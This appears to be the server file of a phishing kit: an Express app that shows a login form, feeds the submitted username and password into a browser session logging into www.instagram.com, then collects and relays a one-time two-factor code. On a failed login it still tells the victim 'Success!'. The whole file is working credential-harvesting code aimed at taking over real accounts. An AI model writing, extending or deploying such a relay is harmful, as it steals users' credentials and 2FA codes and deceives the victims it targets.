const express = require('express')
const app = express()
const path = require('path')
const port = 3000
var bodyParser = require('body-parser')
let multer = require('multer')
let upload = multer()
let Parser = require('./parser');

let parser = new Parser("www.instagram.com");
parser.launchBrowser();

app.set('view engine', 'pug');
app.set('views', './views');

app.use(bodyParser.json()); 
app.use(bodyParser.urlencoded({ extended: true })); 
app.use(upload.array()); 
app.use(express.static('public'));

app.get('/ocp', async function(req, res){
   res.render('ocp');
 });

 app.post('/ocp', async function(req, res){
   let data = await parser.twoStep(req.body.ocp);
 });

app.get('/', async function(req, res){
   res.render('form');
 });
 
 app.post('/', async function(req, res){
    if(await parser.login(req.body.username, req.body.password)){
      res.redirect('/ocp');
    } else {
      
       res.send("Success!");
    }
 });

app.listen(port);